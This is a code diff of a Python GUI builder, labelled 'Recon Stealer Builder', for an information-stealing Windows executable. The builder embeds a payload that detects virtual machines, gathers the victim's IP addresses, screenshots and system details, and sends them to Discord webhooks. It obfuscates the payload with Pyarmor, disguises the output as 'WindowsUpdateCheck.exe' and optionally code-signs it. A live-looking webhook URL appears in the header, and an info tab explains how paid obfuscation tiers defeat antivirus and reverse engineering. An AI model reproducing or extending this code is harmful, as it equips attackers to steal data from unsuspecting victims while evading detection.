@@ -2,18 +2,14 @@ https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-
 
 
 import os
-import sys
 import subprocess
 import tkinter as tk
-from tkinter import messagebox, ttk
+from tkinter import messagebox, ttk, scrolledtext
 import shutil
 import tempfile
 import textwrap
 import requests
-import platform
-import winreg
 import random
-import glob  # For recursive runtime bundling
 
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
@@ -29,27 +25,34 @@ def test_webhook(hook):
 # =================== GUI ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Recon Stealer Builder - Fixed Runtime Edition")
-    root.geometry("700x480")
+    root.title("Recon Stealer Builder - Pyarmor Pack Edition")
+    root.geometry("800x600")
     root.resizable(False, False)
 
-    tk.Label(root, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
-    webhook_entry = tk.Entry(root, width=90)
+    notebook = ttk.Notebook(root)
+    notebook.pack(fill="both", expand=True, padx=10, pady=10)
+
+    # Build Tab
+    build_frame = ttk.Frame(notebook)
+    notebook.add(build_frame, text="Build")
+
+    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
+    webhook_entry = ttk.Entry(build_frame, width=100)
     webhook_entry.pack(pady=5)
 
-    tk.Label(root, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
-    pfx_entry = tk.Entry(root, width=90)
+    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
+    pfx_entry = ttk.Entry(build_frame, width=100)
     pfx_entry.pack(pady=5)
 
-    tk.Label(root, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
-    pass_entry = tk.Entry(root, width=90, show="*")
+    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
+    pass_entry = ttk.Entry(build_frame, width=100, show="*")
     pass_entry.pack(pady=5)
 
-    tk.Label(root, text="Pyarmor Mode:", font=("Arial", 10, "bold")).pack(pady=10)
-    mode_var = tk.IntVar(value=0)  # Default to basic to avoid license errors
-    tk.Radiobutton(root, text="0 - Basic (works on free/trial)", variable=mode_var, value=0).pack()
-    tk.Radiobutton(root, text="1 - Advanced (--advanced 2 + mix-str) - needs Basic+ license", variable=mode_var, value=1).pack()
-    tk.Radiobutton(root, text="2 - Super RFT Mode (--enable-rft) - needs Pro license", variable=mode_var, value=2).pack()
+    ttk.Label(build_frame, text="Obfuscation Mode:", font=("Arial", 10, "bold")).pack(pady=10)
+    mode_var = tk.IntVar(value=0)
+    ttk.Radiobutton(build_frame, text="0 - Basic (free/trial - weak)", variable=mode_var, value=0).pack()
+    ttk.Radiobutton(build_frame, text="1 - Advanced (mix-str etc. - needs Basic+ license)", variable=mode_var, value=1).pack()
+    ttk.Radiobutton(build_frame, text="2 - RFT Super Mode (needs Pro license)", variable=mode_var, value=2).pack()
 
     def run_test():
         hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
@@ -62,9 +65,9 @@ def get_webhook():
             results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
         messagebox.showinfo("Test Results", "\n".join(results))
 
-    tk.Button(root, text="TEST WEBHOOKS", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
+    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)
 
-    progress = ttk.Progressbar(root, mode="indeterminate")
+    progress = ttk.Progressbar(build_frame, mode="indeterminate")
 
     def build():
         raw_hooks = webhook_entry.get().strip()
@@ -84,17 +87,68 @@ def get_webhook():
             generate_malware(webhooks, pfx_path, pfx_pass, mode)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe ready.\nRuntime extraction fixed, screenshot + recon + multi-exfil.\nUse mode 0 if license errors.")
+            messagebox.showinfo("Built", "stealer.exe ready - no more runtime extraction errors.\nScreenshot + recon + multi-exfil + proper Pyarmor packing.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
-            messagebox.showerror("Error", f"{str(e)}\n\nCheck console for full traceback.")
+            messagebox.showerror("Error", f"{str(e)}")
         root.destroy()
 
-    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
+    ttk.Button(build_frame, text="BUILD EXE", command=build, style="Green.TButton").pack(pady=20)
+
+    style = ttk.Style()
+    style.configure("Green.TButton", background="green", foreground="white", font=("Arial", 14, "bold"))
+
+    # Info Tab
+    info_frame = ttk.Frame(notebook)
+    notebook.add(info_frame, text="Info / Licenses")
+
+    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
+    info_text.pack(padx=10, pady=10)
+
+    license_info = textwrap.dedent('''
+    PYARMOR LICENSE INFO (as of Dec 2025)
+
+    Pyarmor has tiered licenses - higher tiers = harder to reverse.
+
+    • Free/Trial Mode:
+      - Basic obfuscation only.
+      - Limits on functions/modules in advanced modes.
+      - No --mix-str, no RFT.
+      - Fine for testing, but AV/reversers laugh at it.
+
+    • Basic License:
+      - Unlocks --advanced 2, --mix-str (string encryption).
+      - One-time fee per product.
+
+    • Pro License:
+      - Full power: --enable-rft (renames functions/classes/vars - decompilers die).
+      - Themida/BCC/JIT options.
+      - Highest protection.
+
+    Pricing & Purchase:
+    - One-time payment (most licenses). Pipeline versions annual.
+    - Buy here: https://pyarmor.dashingsoft.com/cart/order.html
+      or follow the "shopping link" on https://pyarmor.dashingsoft.com/
+    - Paid via Digital River.
+
+    Activation:
+    1. Buy → download your license.reg file.
+    2. Double-click the .reg file to install (Windows registry merge).
+       OR run: pyarmor reg license.reg
+    3. Restart terminal/Python session.
+    4. Verify: pyarmor --version should show your license type.
+
+    If mode 1/2 fails → you don't have the required license. Stick to mode 0 or upgrade.
+
+    Docs: https://pyarmor.readthedocs.io/en/latest/
+    ''')
+    info_text.insert(tk.END, license_info)
+    info_text.config(state=tk.DISABLED)
+
     root.mainloop()
 
-# =================== STEALER CODE (same as before) ===================
+# =================== STEALER CODE (same solid payload) ===================
 stealer_code = textwrap.dedent('''
 import os
 import sys
@@ -115,8 +169,9 @@ try:
 except:
     HAS_PYAUTO = False
 
+# [VM checks unchanged - solid as before]
+
 def is_vm():
-    # [same VM checks as last version]
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
         val = winreg.QueryValueEx(key, "0")[0].lower()
@@ -156,6 +211,8 @@ def is_vm():
     except: pass
 
     return "No"
+
+# [rest of functions unchanged]
 
 def get_public_ip():
     for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
@@ -239,10 +296,10 @@ Local IP      : {get_local_ip()}
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
-# =================== BUILD (fixed runtime bundling) ===================
+# =================== BUILD - Now using pyarmor --pack ===================
 def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     if not shutil.which("pyarmor"):
-        raise Exception("pyarmor not installed - pip install pyarmor")
+        raise Exception("pyarmor missing - pip install pyarmor")
 
     temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
     script = os.path.join(temp_dir, "recon.py")
@@ -250,54 +307,27 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     with open(script, "w", encoding="utf-8") as f:
         f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))
 
-    obf_dir = os.path.join(temp_dir, "obf")
-
-    gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
+    # Build pyarmor gen command with pack
+    gen_cmd = ["pyarmor", "gen"]
     if mode == 1:
         gen_cmd += ["--advanced", "2", "--mix-str"]
     elif mode == 2:
         gen_cmd += ["--enable-rft"]
-    gen_cmd += [script]
+    gen_cmd += ["--pack", "onefile", "--name", "WindowsUpdateCheck", "--clean", script]
 
     result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
     if result.returncode != 0:
-        raise Exception(f"Pyarmor failed (likely license issue for mode {mode}):\n{result.stdout}\n{result.stderr}")
+        raise Exception(f"Pyarmor pack failed (check license for your mode):\n{result.stdout}\n{result.stderr}")
 
-    obf_script = os.path.join(obf_dir, "recon.py")
+    # Final exe is in temp_dir/dist/WindowsUpdateCheck.exe
+    packed_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
+    if not os.path.exists(packed_exe):
+        raise Exception("Packed exe not found - pyarmor fucked up.")
 
-    # Find the runtime package folder
-    runtime_packages = glob.glob(os.path.join(obf_dir, "pyarmor_runtime_*"))
-    if not runtime_packages:
-        raise Exception("Pyarmor runtime package not generated - wtf?")
-    runtime_path = runtime_packages[0]
-
-    # Build pyinstaller add-data args for EVERY file in runtime (recursive)
-    add_data_args = []
-    for root, _, files in os.walk(runtime_path):
-        for file in files:
-            full_path = os.path.join(root, file)
-            rel_path = os.path.relpath(full_path, obf_dir)
-            add_data_args += ["--add-data", f"{full_path}{os.pathsep}{rel_path}"]
-
-    cmd = [
-        "pyinstaller",
-        "--onefile",
-        "--noconsole",
-        "--name", "WindowsUpdateCheck",
-        "--clean",
-        "--hidden-import=winreg",
-        "--hidden-import=pyautogui",
-        "--hidden-import=requests",
-    ] + add_data_args + [obf_script]
-
-    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
-    if result.returncode != 0:
-        raise Exception(f"PyInstaller failed:\n{result.stderr}")
-
-    exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
     final = os.path.join(os.getcwd(), "stealer.exe")
-    shutil.copyfile(exe, final)
+    shutil.copyfile(packed_exe, final)
 
+    # Optional signing
     if pfx_path and os.path.exists(pfx_path):
         sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
         if pfx_pass:
@@ -307,13 +337,10 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
         if sign_result.returncode != 0:
             print(f"Signing failed:\n{sign_result.stderr}")
         else:
-            print("Signed.")
+            print("EXE signed.")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Fixed stealer built: {final}")
-
-if __name__ == "__main__":
-    get_webhook()
+    print(f"Extraction-proof stealer built: {final}")
 
 if __name__ == "__main__":
     get_webhook()
